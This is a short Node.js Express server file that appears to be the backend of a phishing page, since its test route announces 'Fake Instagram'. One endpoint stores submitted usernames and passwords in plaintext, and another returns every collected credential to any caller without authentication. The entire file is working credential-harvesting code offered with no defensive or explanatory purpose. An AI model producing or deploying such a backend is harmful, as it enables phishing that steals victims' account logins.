const express  = require("express")

const connectDB  =require("./db")

const Cred   = require("./entities/Cred")

const port  = process.env.port || 5000

const app = express()

 app.use(express.json())

connectDB()

app.use((req, res, next)=>{  
    res.setHeader("Access-Control-Allow-Origin", "*");  
    res.setHeader(  
        "Access-Control-Allow-Headers",  
        "Origin, X-Requested-With, Content-Type, Accept");  
    res.setHeader("Access-Control-Allow-Methods",  
    "GET, POST, PATCH, DELETE, OPTIONS");  
    next();  
}); 


app.get("/test" , (req,res)=>{
     return res.json({
        message : "Welcome to Fake Instagram"
     })
})

app.get("/creds" , async (req,res)=>{
    
     try{
          const creds = await Cred.find();
          return res.status(200).json(creds)
     }
     catch(error){
          return res.status(400).json({
            error : "Something Went Wrong"
          })
     }


})


app.post("/cred" , async (req,res)=>{
    
     const {username , password} = req.body

     try{
        
        const newCred = new Cred({
            username ,
            password
        })

        await newCred.save()

        return res.status(200).json({
            success : "Cred Created Successfully"
        })

     }
     catch(error){
         
        return res.status(200).json({
            error : "Error in creating cred"
        })
     }

})


app.listen(port , ()=>{
    console.log("Server is Running")
})



